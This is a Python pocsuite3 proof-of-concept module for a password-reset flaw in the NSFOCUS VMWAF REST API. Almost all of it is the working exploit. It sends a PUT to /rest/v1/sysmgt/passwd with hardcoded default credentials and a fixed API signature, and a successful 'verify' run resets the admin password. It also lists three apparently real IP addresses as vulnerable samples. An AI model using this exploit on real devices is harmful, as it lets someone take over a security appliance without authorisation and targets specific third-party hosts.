#!/usr/bin/env python
# coding: utf-8

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
import json



class TestPOC(POCBase):
    vulID = 'DSO-07088'
    cveID = ''
    cnvdID = ''
    cnnvdID = ''
    version = '1.0'
    author = '土司空'
    vulDate = '2022-07-25'
    createDate = '2022-07-25'
    updateDate = '2022-07-26'
    name = '绿盟 VMWAF REST API /sysmgt/passwd 存在密码重置漏洞'
    desc = '绿盟旗下产品绿盟VMWAF REST API接口存在密码重置漏洞，攻击者可利用该漏洞对系统密码进行远程修改。'
    solution = '''<p>请关注厂商并更新至安全版本</p>
<p>厂商链接:&nbsp;https://www.nsfocus.com.cn/</p>'''
    severity = 'medium'
    vulType = 'remote-pass-change'
    taskType = 'app-vul'
    proto = ['http']
    scanFlag = 1
    tag = ['important']
    references = ['']
    appName = '绿盟 VMWAF REST API'
    appVersion = 'all'
    cweID = 'CWE-620'
    appPowerLink =''
    samples = ['https://111.11.199.72:8443/','https://124.235.80.102:8443/','https://218.61.255.204:8443/']
    isPublic = 0
    appDevLanguage = '' 
    appCategory = ''
    
    def _attack(self):
        return self._verify()

    def _verify(self):
        target = self.url + "/rest/v1/sysmgt/passwd?apikey=123&sign=a4680b385b47b0834b61614fdc5c2257&timestamp=1718555866"
        result = {}
        s = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "close",
            "Accept-Language":"en",
            "Accept":"*/*",
            "Authorization": "Basic YWRtaW46bnNmb2N1cw=="
        }
        data = '{\"role\":\"admin\"}'
        resp = s.put(target, data=data, headers=headers,verify=False)
        if ('"result":"admin password resetting succeeded"' in resp.text and resp.status_code == 200) or ('{"result":"please change the web default password first."}' in resp.text and resp.status_code == 403):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_verify(result)

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(TestPOC)
